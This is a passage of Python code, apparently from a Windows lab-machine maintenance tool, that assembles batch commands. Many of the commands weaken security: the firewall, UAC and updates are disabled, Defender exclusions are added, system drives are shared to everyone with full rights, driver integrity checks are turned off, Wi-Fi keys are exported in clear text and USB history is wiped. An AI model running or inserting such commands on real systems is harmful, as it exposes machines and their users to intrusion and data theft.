            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /t REG_DWORD /v DisableConfig /d 0 /f'
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /t REG_DWORD /v SystemRestorePointCreationFrequency /d 1440 /f'
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641} /d CLSID_ThisPCDesktopRegFolder /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641} /v HideIfEnabled /f"
            + chr(10)
            + 'for /f "delims=" %%i in (\'reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\') do (if "%%i" equ "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}" (echo) else (reg delete %%i /f))'
            + chr(10)
            + "sc stop TDNetFilter"
            + chr(10)
            + "net start termservice"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\维护清理\\command /d "
            + chr(34)
            + MainTainClean
            + chr(34)
            + " /f"
            + chr(10)
            + "copy /Y "
            + nlxjt_ttf
            + " %WINDIR%\\Fonts\\NLXJT.ttf"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts" /t REG_SZ /v "NLXJT Regular (TrueType)" /d "NLXJT.ttf" /f'
            + chr(10)
            + "copy /Y "
            + pingfang_ttf
            + " %WINDIR%\\Fonts\\PINGFANG.ttf"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts" /t REG_SZ /v "苹方 中等 (TrueType)" /d "PINGFANG.ttf" /f'
            + chr(10)
            + "copy /Y "
            + nlxjt_ttf
            + " %WINDIR%\\Fonts\\NLXJT.ttf"
            + chr(10)
            + 'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts" /t REG_SZ /v "NLXJT Regular (TrueType)" /d "NLXJT.ttf" /f'
            + chr(10)
            + "copy /Y "
            + pingfang_ttf
            + " %WINDIR%\\Fonts\\PINGFANG.ttf"
            + chr(10)
            + 'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts" /t REG_SZ /v "苹方 中等 (TrueType)" /d "PINGFANG.ttf" /f'
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\维护清理 /d 维护清理 /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\维护清理 /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权维护清理\\command /d "
            + chr(34)
            + NSudo
            + " -U:S -P:E -M:S -Priority:RealTime "
            + MainTainClean
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权维护清理 /d 提权维护清理 /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权维护清理 /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权命令行\\command /d "
            + chr(34)
            + NSudo
            + " -U:T -P:E -M:S -Priority:RealTime cmd"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权命令行 /d 提权命令行 /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\提权命令行 /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\命令行\\command /d "
            + chr(34)
            + "cmd"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\命令行 /d 命令行 /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\命令行 /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\刷新Protect\\command /d "
            + chr(34)
            + 'cmd /c schtasks /End /tn ZhangProtect\\Protect & taskkill /f /im Protect.exe /t & schtasks /Run /tn ZhangProtect\\Protect /I & start mshta vbscript:Msgbox(\\"刷新完成\\")(window.close)'
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\刷新Protect /d 刷新Protect /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\刷新Protect /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\打开Protect目录\\command /d "
            + chr(34)
            + "explorer "
            + "\\"
            + '"'
            + ProtectDir
            + "\\"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\打开Protect目录 /d 打开Protect目录 /f"
            + chr(10)
            + "reg add HKEY_CLASSES_ROOT\\Directory\\background\\shell\\打开Protect目录 /t REG_SZ /v icon /d "
            + chr(34)
            + ProtectExe
            + ",0"
            + chr(34)
            + " /f"
            + chr(10)
            + "if exist "
            + powerkeep
            + " ("
            + chr(10)
            + "powercfg /change monitor-timeout-ac 3"
            + chr(10)
            + "powercfg /change monitor-timeout-dc 3"
            + chr(10)
            + "powercfg /change disk-timeout-ac 3"
            + chr(10)
            + "powercfg /change disk-timeout-dc 3"
            + chr(10)
            + "powercfg /change standby-timeout-ac 3"
            + chr(10)
            + "powercfg /change standby-timeout-dc 3"
            + chr(10)
            + "powercfg /change hibernate-timeout-ac 3"
            + chr(10)
            + "powercfg /change hibernate-timeout-dc 3) else ("
            + chr(10)
            + "powercfg /change monitor-timeout-ac 0"
            + chr(10)
            + "powercfg /change monitor-timeout-dc 10"
            + chr(10)
            + "powercfg /change disk-timeout-ac 0"
            + chr(10)
            + "powercfg /change disk-timeout-dc 10"
            + chr(10)
            + "powercfg /change standby-timeout-ac 0"
            + chr(10)
            + "powercfg /change standby-timeout-dc 10"
            + chr(10)
            + "powercfg /change hibernate-timeout-ac 0"
            + chr(10)
            + "powercfg /change hibernate-timeout-dc 10)"
            + chr(10)
            + "NetSh Advfirewall set allprofiles state off"
            + chr(10)
            + "bcdedit /set hypervisorlaunchtype off"
            + chr(10)
            + "powershell bcdedit /set hypervisorlaunchtype off"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share ProtectDirShare="
            + ProtectDir[:-1]
            + " /unlimited /grant:everyone,read) else (net share ProtectDirShare /delete)"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share DataDiskShare="
            + datadir
            + ": /unlimited /grant:everyone,full) else (net share DataDiskShare /delete)"
            + chr(10)
            + "if %hidesettingflag% equ "
            + chr(34)
            + "1"
            + chr(34)
            + " (net share SystemDiskShare=%systemdrive% /unlimited /grant:everyone,full) else (net share SystemDiskShare /delete)"
            + chr(10)
            + "net localgroup users "
            + chr(34)
            + "%username%"
            + chr(34)
            + " /add"
            + chr(10)
            + "net localgroup administrators "
            + chr(34)
            + "%username%"
            + chr(34)
            + " /add"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v UpdateServiceUrlAlternate /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUStatusServer /t REG_SZ /d 127.0.0.1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUShutdownOption /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUAsDefaultShutdownOption /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NlaSvc\\Parameters\\Internet /v EnableActiveProbing /t  REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\NetworkConnectivityStatusIndicator /t REG_DWORD /v NoActiveProbe /d 1 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d RemoteSigned /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket\\Volume /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control /t REG_SZ /v WaitToKillServiceTimeout /d 1500 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {018D5C66-4533-4307-9B53-224DE2ED1FE6} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {04271989-C4D2-3275-BDC7-29C71C3AC817} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {7AE6DE87-C956-4B40-9C89-3D166C9841D3} /d 1 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {018D5C66-4533-4307-9B53-224DE2ED1FE6} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {04271989-C4D2-3275-BDC7-29C71C3AC817} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {7AE6DE87-C956-4B40-9C89-3D166C9841D3} /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoDriveTypeAutoRun /d 255 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoDriveTypeAutoRun /d 255 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v limitblankpassworduse /d 0 /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /f"
            + chr(10)
            + "echo y | reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v fDenyTSConnections /d 0 /f"
            + chr(10)
            + 'reg add "HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys" /t reg_sz /v Flags /d 26 /f'
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v fSingleSessionPerUser /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
            + chr(34)
            + " /t REG_DWORD /v MaxInstanceCount /d 999999 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /t REG_DWORD /v KeepAliveEnable /d 1 /f'
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters"
            + chr(34)
            + " /t REG_DWORD /v AllowEncryptionOracle /d 2 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v fDenyTSConnections /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v fSingleSessionPerUser /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"
            + chr(34)
            + " /t REG_DWORD /v MaxInstanceCount /d 999999 /f"
            + chr(10)
            + "sc config remoteregistry start=auto"
            + chr(10)
            + "sc start remoteregistry"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + ProtectDir
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + ProtectExe
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            + chr(34)
            + " /t REG_DWORD /v "
            + chr(34)
            + WindowsDir
            + chr(34)
            + " /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel /t REG_DWORD /v {645FF040-5081-101B-9F08-00AA002F954E} /d 1 /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v LastEnum /f"
            + chr(10)
            + "regini "
            + chr(34)
            + reginifile
            + chr(34)
            + chr(10)
            + "bcdedit /set nointegritychecks on"
            + chr(10)
            + "bcdedit /set {bootmgr} displaybootmenu no"
            + chr(10)
            + 'copy /Y "'
            + SnapShotExe
            + '" %datadir%:\\Important\\System_Backup\\Tool.exe'
            + chr(10)
            + "systray"
            + chr(10)
            + "rd /s /q %systemdrive%\\$RECYCLE.BIN >>nul"
            + chr(10)
            + "rd /s /q"
            + " "
            + datadir
            + ":\\$RECYCLE.BIN >>nul"
            + chr(10)
            + "netsh wlan export profile key=clear folder=%datadir%:\\StorageRedirect\\Wlansvc\\"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\icssvc\\Settings /t REG_DWORD /v WifiMaxPeers /d 128 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v NukeOnDelete /t REG_DWORD /d 1 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /v NukeOnDelete /t REG_DWORD /d 1  /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v Recyclebinsize /t REG_SZ /d 0 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f"
            + chr(10)
            + "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d RemoteSigned /f"
        )
        BatComA2 = (
            "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v Desktop /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Desktop-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v {374DE290-123F-4565-9164-39C4925E467B} /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Download-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v Personal /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Documents-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "My Music"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Music-%username%"
            + chr(34)
            + " /f "
        )
        BatComA3 = (
            "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "My Video"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Videos-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_SZ /v "
            + chr(34)
            + "My Pictures"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Pictures-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v Desktop /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Desktop-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v {374DE290-123F-4565-9164-39C4925E467B} /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Download-%username%"
            + chr(34)
            + " /f "
        )
        BatComA4 = (
            "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v Personal /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Documents-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "My Music"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Music-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "My Video"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Videos-%username%"
            + chr(34)
            + " /f "
            + chr(10)
            + "Reg add "
            + chr(34)
            + "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"
            + chr(34)
            + " /t REG_EXPAND_SZ /v "
            + chr(34)
            + "My Pictures"
            + chr(34)
            + " /d "
            + chr(34)
            + datadir
            + ":\\StorageRedirect\\Pictures-%username%"
            + chr(34)
            + " /f "
        )
        BatComA5 = (
            "reg add "
            + chr(34)
            + "HKLM\\system\\CurrentControlSet\\Control\\terminal server"
            + chr(34)
            + " /v AllowRemoteRPC /d 1 /f"
            + chr(10)
            + 'regedit /s "'
            + RDPreg
            + '"'
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ZhangProtectCCleaner /t REG_SZ /d "
            + chr(34)
            + CCleanerExe
            + " /AUTO"
            + chr(34)
            + " /f"
        )
        BatComA6 = (
            "label "
            + datadir
            + ":数据盘"
            + chr(10)
            + "label %systemdrive%系统盘"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.log"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.sys"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.tmp"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.dsk"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.ini"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.tpm"
            + chr(10)
            + "attrib +h +r +s %systemdrive%\\*.*"
            + chr(10)
            + "attrib +h %datadir%:\\*.*"
            + chr(10)
            + "for /f \"delims=\" %%i in ('dir /B /A %systemdrive%\\') do (if "
            + chr(34)
            + "%systemdrive%\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%systemdrive%\\Program Files"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%systemdrive%\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%systemdrive%\\Program Files (x86)"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%systemdrive%\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%systemdrive%\\Users"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%systemdrive%\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%systemdrive%\\Windows"
            + chr(34)
            + " (echo) else (attrib +h +s +r "
            + chr(34)
            + "%systemdrive%\\%%i"
            + chr(34)
            + ")))))"
            + chr(10)
            + 'if "%datadir%:" equ "%systemdrive%" (echo) else (for /f "delims=" %%i in (\'dir /B /A %datadir%:\\\') do (if '
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%datadir%:\\Files"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%datadir%:\\StorageRedirect"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%datadir%:\\学科文件夹"
            + chr(34)
            + ' (if exist "%datadir%:\\学科文件夹\\hide" (attrib +r +s +a +h '
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + ") else (echo)) else (if "
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "%datadir%:\\Important"
            + chr(34)
            + " (echo) else (attrib +h +r +s "
            + chr(34)
            + "%datadir%:\\%%i"
            + chr(34)
            + "))))))"
            + chr(10)
            + "for /f "
            + chr(34)
            + "delims="
            + chr(34)
            + " %%k in ("
            + chr(39)
            + "reg query HKCR\\CLSID /s /f Onedrive"
            + chr(39)
            + ") do reg add "
            + chr(34)
            + "%%k"
            + chr(34)
            + " /t REG_DWORD /v System.IsPinnedToNameSpaceTree /d 0 /f"
            + chr(10)
            + "cmd "
            + ProtectSchTask
            + chr(10)
            + autochangepreD
            + chr(10)
            + "for %%a in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @("
            + chr(10)
            + "if exist %%a: ("
            + chr(10)
            + "if %%a: equ %systemdrive% ("
            + chr(10)
            + "rmdir /s /q %%a:\\autorun.inf\\Protect..\\"
            + chr(10)
            + "rmdir /s /q %%a:\\autorun.inf\\"
            + chr(10)
            + ") else ("
            + chr(10)
            + "if %%a: equ %datadir%: ("
            + chr(10)
            + "rmdir /s /q %%a:\\autorun.inf\\Protect..\\"
            + chr(10)
            + "rmdir /s /q %%a:\\autorun.inf"
            + chr(10)
            + ") else ("
            + chr(10)
            + "del %%a:\\autorun.inf /f /q"
            + chr(10)
            + "mkdir %%a:\\autorun.inf"
            + chr(10)
            + "mkdir %%a:\\autorun.inf\\"
            + chr(34)
            + "Protect../"
            + chr(34)
            + ""
            + chr(10)
            + "attrib +h +r +s %%a:\\autorun.inf"
            + chr(10)
            + ")"
            + chr(10)
            + ")"
            + chr(10)
            + ")"
            + chr(10)
            + ")"
            + chr(10)
            + "for /f "
            + chr(34)
            + "delims="
            + chr(34)
            + " %%i in ("
            + chr(39)
            + "reg query HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default"
            + chr(39)
            + ") do ("
            + chr(10)
            + "if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\AppEvents\Schemes\Apps\.Default\Minimize"
            + chr(34)
            + " (echo) else (if "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
